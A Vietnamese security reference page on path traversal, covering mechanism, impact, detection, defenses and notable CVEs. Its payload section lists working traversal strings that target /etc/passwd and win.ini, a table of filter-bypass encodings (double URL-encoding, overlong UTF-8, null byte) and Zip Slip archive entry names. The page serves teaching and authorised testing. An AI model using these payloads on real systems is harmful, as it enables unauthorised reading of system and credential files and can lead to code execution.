# Path Traversal

> Các đường dẫn file bị thao túng (../) đọc hoặc ghi file bên ngoài thư mục dự định. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/path_traversal.md`](../../../../Troubleshooting_Guide/path_traversal.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** Directory Traversal · A01:2021 Broken Access Control
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Path traversal (directory traversal) cho phép kẻ tấn công thao túng một đường dẫn file mà ứng dụng
dựng từ đầu vào — thường bằng các chuỗi `../` — để truy cập các file bên ngoài thư mục dự định. Nó
biến một tính năng phục vụ file trong một thư mục thành cách đọc hoặc ghi file tùy ý trên máy chủ.

## Cơ chế hoạt động (How it works)
Ứng dụng lấy một tên file hoặc đường dẫn từ request và nối nó vào một thư mục gốc, rồi đọc hoặc ghi
nó mà không phân giải và ràng buộc kết quả. Kẻ tấn công kiểm soát tên file đó và chèn các đoạn `../`
(hoặc một đường dẫn tuyệt đối) để đường dẫn đã phân giải trèo ra khỏi thư mục gốc. Sai lầm của ứng
dụng là tin tưởng đầu vào và xác thực nó trước, thay vì sau, khi giải mã và chuẩn hóa — đó là lý do
tại sao mã hóa, mã hóa kép, các chuỗi lồng nhau, và null byte vượt được các bộ lọc ngây thơ.

## Tác động (Impact)
Tiết lộ các file nhạy cảm (`/etc/passwd`, file cấu hình, mã nguồn, khóa SSH, thông tin xác thực),
thường tạo điều kiện cho xâm nhập sâu hơn. Các điểm đích có khả năng ghi (tải lên, giải nén archive —
"Zip Slip") cho phép gài các file như webshell hoặc ghi đè binary, leo thang thành RCE. Mức độ nghiêm
trọng dao động từ cao (đọc) đến nghiêm trọng (ghi/RCE).

## Cách phát hiện (How to detect)
- Một `../../../etc/passwd` cơ sở (hoặc `..\..\..\windows\win.ini` trên Windows) trả về nội dung
  file dễ nhận biết.
- Các biến thể mã hóa (`%2e%2e%2f`, mã hóa kép `%252f`) thành công ở nơi bản literal bị chặn, cho
  thấy việc xác thực chạy trước khi giải mã.
- Thông báo lỗi làm rò rỉ các đường dẫn tuyệt đối, hoặc các phản hồi khác nhau cho đường dẫn hợp lệ
  so với đường dẫn traversal (không-tìm-thấy-file so với từ-chối-truy-cập) đóng vai trò một oracle.

## Khai thác (tóm tắt) (Exploitation)
Xác nhận bằng một chuỗi `../` chuẩn tới một file đã biết, rồi leo thang sang cách vượt khớp với cơ
chế phòng thủ quan sát được: đường dẫn tuyệt đối khi `../` bị loại bỏ, các chuỗi lồng nhau (`....//`)
đối với việc loại bỏ không đệ quy, mã hóa URL đơn/kép và UTF-8 quá dài đối với các lỗi thứ tự giải
mã, và một null byte `%00` đối với việc nối hậu tố phần mở rộng trong các stack cũ. Cùng kỹ thuật
traversal đó áp dụng cho các điểm đích không phải HTTP như giải nén archive và `include`/`require`.
Payload đầy đủ nằm trong phần Payload và tài liệu chuyên sâu.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Phép thử cơ sở (Baseline probes)
Bắt đầu với chuỗi chuẩn và một vài mã hóa nhanh trước khi leo thang sang các cách vượt đặc thù cho cơ chế phòng thủ.

```text
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
....//....//....//etc/passwd
/etc/passwd
```

### Vượt theo cơ chế phòng thủ quan sát được (Bypass by defence observed)
Chọn kỹ thuật khớp với cách ứng dụng có vẻ đang làm sạch đầu vào.

| Cơ chế phòng thủ áp dụng | Cách vượt | Ví dụ |
|------------------|--------|---------|
| Không có | traversal thuần (Unix/Windows) | `../../../etc/passwd` · `..\..\..\windows\win.ini` |
| Chặn `../`, chấp nhận tuyệt đối | đường dẫn tuyệt đối | `/etc/passwd` · `C:\Windows\win.ini` |
| Loại bỏ `../` một lần, không đệ quy | chuỗi lồng nhau sống sót qua việc loại bỏ | `....//....//....//etc/passwd` · `..../..../..../etc/passwd` |
| Xác thực trước khi giải mã URL | mã hóa URL đơn/kép | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd` · `..%252f..%252f..%252fetc/passwd` |
| Yêu cầu đường dẫn bắt đầu trong một thư mục gốc | bắt đầu bằng thư mục gốc, rồi traverse ra | `/var/www/images/../../../etc/passwd` |
| Loại bỏ phần mở rộng đuôi (C cũ) | ký tự kết thúc null byte | `../../../etc/passwd%00.png` |
| Giải mã UTF-8 sau khi xác thực | mã hóa UTF-8 quá dài của `/` | `..%c0%af..%c0%af..%c0%afetc/passwd` |
| Chỉ chặn `/` | dấu gạch chéo ngược / gạch chéo trộn | `..%5c..%5c..%5cetc/passwd` · `..%2F..%5c..%2Fetc/passwd` |

### Các biến thể mã hóa (Encoding variants)
Dấu phân cách (`/`) và các dấu chấm có thể được mã hóa ở nhiều cấp; xoay vòng qua chúng khi một bộ lọc loại bỏ các literal.

```text
# single URL-encode
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
# double URL-encode (validation runs before the decode)
..%252f..%252f..%252fetc/passwd
%252e%252e%252f
# overlong UTF-8 for "/"
..%c0%af..%c0%af..%c0%afetc/passwd
..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
..%f0%80%80%af..%f0%80%80%af..%f0%80%80%afetc/passwd
# case of hex digits can matter
..%2F..%2F   (uppercase)
..%2f..%2f   (lowercase)
```

### Mẹo chuẩn hóa đường dẫn (Path-normalisation tricks)
Các dấu phân cách dư thừa và các đoạn `./` co lại thành một traversal sau khi chuẩn hóa.

```text
/etc//passwd
/var/www/images//../../etc/passwd
/var/www/images/./../../etc/passwd
/var/www/images/foo/../..//etc/passwd
```

### UNC / SMB của Windows và các trình xử lý giao thức (Windows UNC / SMB and protocol handlers)
Tới được các share từ xa hoặc ép một trình phân giải khác.

```text
\\server\share\file.txt
//server/share/file.txt
file://\etc\passwd
```

### Các điểm đích không phải HTTP (Non-HTTP sinks)
Cùng kỹ thuật traversal áp dụng ở bất cứ đâu một đường dẫn được dựng từ đầu vào.

```text
# Zip Slip — malicious entry name in an archive escapes the extract dir
../../../../tmp/evil.sh
..\..\..\..\tmp\evil.sh

# PHP include/require — null byte or encoding to defeat suffixing
../../../../etc/passwd%00
..%2F..%2F..%2F..%2Fetc/passwd
```

## Phòng chống (Defenses)
1. **Tránh dùng đầu vào người dùng trong các đường dẫn file.** Nơi có thể, ánh xạ một định danh
   không rõ nghĩa (chỉ số, ID) tới một tên file phía máy chủ thay vì chấp nhận một đường dẫn (bản vá
   mạnh nhất).
2. **Chuẩn hóa, rồi xác minh sự bao hàm** — phân giải đường dẫn thực đầy đủ (ví dụ `realpath`,
   `Path.GetFullPath`, `Files.normalize`) và xác nhận nó vẫn bắt đầu bằng thư mục gốc dự định; từ
   chối nếu không. Xác thực sau tất cả việc giải mã, không bao giờ trước.
3. **Lập danh sách cho phép (allow-list)** các tên file/phần mở rộng được phép và loại bỏ các dấu
   phân cách thư mục; không dựa vào việc blacklist `../`.
4. Chạy với **đặc quyền tối thiểu** để ngay cả một traversal thành công cũng chỉ tới được ít file,
   và đối với giải nén archive hãy xác thực đường dẫn đã phân giải của từng entry (Zip Slip).

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Path+Traversal
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Path+Traversal
- **Exploit-DB** — https://www.exploit-db.com/search?q=Path+Traversal
- **GitHub Advisories** — https://github.com/advisories?query=Path+Traversal
- **OSV** — https://osv.dev/list?q=Path+Traversal
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, X/Twitter infosec.
- _Mẹo tìm kiếm: thêm sản phẩm + phiên bản mục tiêu, ví dụ `Path Traversal <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi dựa vào chi tiết._
- `CVE-2021-41773` — Path traversal trong Apache HTTP Server 2.4.49 (`..` đã mã hóa) dẫn tới tiết lộ
  file và RCE; bị khai thác trong thực tế.
- `CVE-2021-21972` — Directory traversal trong VMware vCenter cho phép ghi file và RCE không cần xác thực.
- `CVE-2019-11510` — Đọc file tùy ý trong Pulse Connect Secure qua path traversal, bị khai thác hàng loạt.

## Tham khảo (References)
- PortSwigger Web Security Academy — Path traversal.
- OWASP — Path Traversal (WSTG) và Input Validation Cheat Sheet.
- RFC 3986 — URI Generic Syntax (chuẩn hóa đường dẫn, loại bỏ đoạn dấu chấm).
